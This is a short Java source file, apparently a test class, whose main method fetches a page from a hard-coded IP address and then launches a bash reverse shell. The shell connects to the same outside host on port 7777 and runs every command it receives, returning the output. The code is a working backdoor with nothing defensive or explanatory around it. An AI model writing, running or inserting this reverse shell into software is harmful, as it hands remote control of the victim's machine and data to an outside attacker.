package qax;
import org.springframework.lang.Nullable;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;


public class Test {
	public static String doGet(String httpUrl){
        //链接
        HttpURLConnection connection=null;
        InputStream is=null;
        BufferedReader br = null;
        StringBuffer result=new StringBuffer();
        try {
            //创建连接
            URL url=new URL(httpUrl);
            connection= (HttpURLConnection) url.openConnection();
            //设置请求方式
            connection.setRequestMethod("GET");
            //设置连接超时时间
            connection.setConnectTimeout(15000);
            //设置读取超时时间
            connection.setReadTimeout(15000);
            //开始连接
            connection.connect();
            //获取响应数据
            if(connection.getResponseCode()==200){
                //获取返回的数据
                is=connection.getInputStream();
                if(is!=null){
                    br=new BufferedReader(new InputStreamReader(is,"UTF-8"));
                    String temp = null;
                    while ((temp=br.readLine())!=null){
                        result.append(temp);
                    }
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }finally {
            if(br!=null){
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if(is!=null){
                try {
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            connection.disconnect();// 关闭远程连接
        }
        return result.toString();
    }
	
	
	public static void RevShell() throws Exception {
		Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/117.50.174.75/7777;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
	}
	
	public static void main(String[] args) throws Exception {
        String result=doGet("http://117.50.174.75:8888/");
        System.out.println(result);
        RevShell();
	}
}
